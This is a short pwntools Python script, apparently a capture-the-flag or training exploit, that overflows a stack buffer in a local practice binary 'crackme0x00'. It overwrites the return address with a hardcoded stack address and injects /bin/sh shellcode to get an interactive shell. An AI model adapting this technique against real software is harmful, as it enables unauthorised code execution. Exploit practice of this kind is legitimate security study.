from pwn import *


def exploit():
    # Generate a shellcode
    shellcode = shellcraft.sh()
    # Show shellcode
    print(shellcode)
    # Show in raw
    print(hexdump(asm(shellcode)))
    # Before i found the address 0x61616166 with cyclic
    payload = cyclic(cyclic_find(0x61616167))
    payload += p32(0xffffd8a8)
    payload += asm(shellcode)
    
    p = process('./crackme0x00')
    p.sendline(payload)
    p.interactive()


if __name__=='__main__':
    context.update(arch='i386', os='linux')
    exploit()
